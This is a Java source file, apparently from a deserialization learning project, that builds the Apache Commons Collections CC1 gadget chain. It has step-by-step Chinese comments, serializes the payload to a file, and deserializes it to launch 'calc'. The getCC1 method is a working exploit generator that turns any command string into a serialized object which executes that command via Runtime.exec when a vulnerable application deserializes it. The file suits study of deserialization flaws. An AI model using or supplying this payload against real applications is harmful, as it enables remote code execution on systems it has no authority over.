package com.demo.testcc;

import com.demo.common.Utils;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

// DeserDemo\DemoTestCC\src\main\java\com\demo\testcc\TestCC1.java

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
 */

public class TestCC1 {



    public static void main(String[] args) throws Exception {

        System.setProperty("sun.misc.ProxyGenerator.saveGeneratedFiles", "true");
        System.setProperty("jdk.proxy.ProxyGenerator.saveGeneratedFiles", "true");

        String file = "testcc.ser";
        Utils.Serialize(TestCC1.getCC1("calc"), file);

        Utils.Deserialize(file);

    }


    public static InvocationHandler getCC1(final String command) throws Exception {
        final String[] execArgs = new String[]{command};

        final Transformer transformerChain = new ChainedTransformer(
                new Transformer[]{new ConstantTransformer(1)});

        // step 5
        // ConstantTransformer忽略输入key，单纯返回 Runtime.Class，该输出作为下个Transformer的输入
        // 第一个InvokerTransformer 的输入为Runtime.class，返回 method 对象，之后再调用该 method对象的invoke方法来反射调用Runtime
        // .getRuntime获取到一个Runtime对象，通过Runtime对象我们才能执行exec来执行命令
        final Transformer[] iTransformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{
                        String.class, Class[].class}, new Object[]{
                        "getRuntime", new Class[0]}),

                new InvokerTransformer("invoke", new Class[]{
                        Object.class, Object[].class}, new Object[]{
                        null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class}, execArgs),
        };

        final Map innerMap = new HashMap();


        // step4
        // transformerChain 为 ChainedTransformer 实例化对象
        // ChainedTransformer.transform方法会遍历字段`Transformer[] iTransformers`进行迭代式的处理
        Reflections.setFieldValue(transformerChain, "iTransformers", iTransformers);

        // step3
        // LazyMap的实例化需要一个 Map对象 与一个 Transformer 对象
        // 当LazyMap.get(key)的入参key不在当前映射表中时，会先通过 factory.transform(key) 获取value，然后保存key-value
        // 这里的 factory 则为我们实例化时传入的 Transformer对象
        // 由此，lazyMap.get()触发了 transformerChain.transform()
        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        Constructor<?> c =
                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructors()[0];
        c.setAccessible(true);

        // step3
        // handler2 为 AnnotationInvocationHandler的实例化对象
        // AnnotationInvocationHandler用于获取一些方法关于某个注解的内容，
        // 构造函数中，分别传入 注解类型、注解成员变量及其值（这里表现为 目标方法的注解值）
        // handler2.invoke() 调用 memberValues.get（）方法，即调用 lazyMap.get()
        InvocationHandler handler2 = (InvocationHandler) c.newInstance(Override.class, lazyMap);

        // step2
        // mapProxy为动态生成的代理类的实例对象，代理了Map Interface相关方法，InvocationHandler为handler1
        // mapProxy.entrySet()被调用后，触发handler1的invoke()方法来实现动态代理功能
        Map mapProxy = (Map) Proxy.newProxyInstance(Thread.currentThread().getContextClassLoader()
                , new Class<?>[]{Map.class}, handler2);


        // step1
        // handler1 为 AnnotationInvocationHandler的实例化对象
        // 通过 AnnotationInvocationHandler readObject魔术方法触发 mapProxy的entrySet()
        InvocationHandler handler1 = (InvocationHandler) c.newInstance(Override.class, mapProxy);

        return handler1;
    }
}
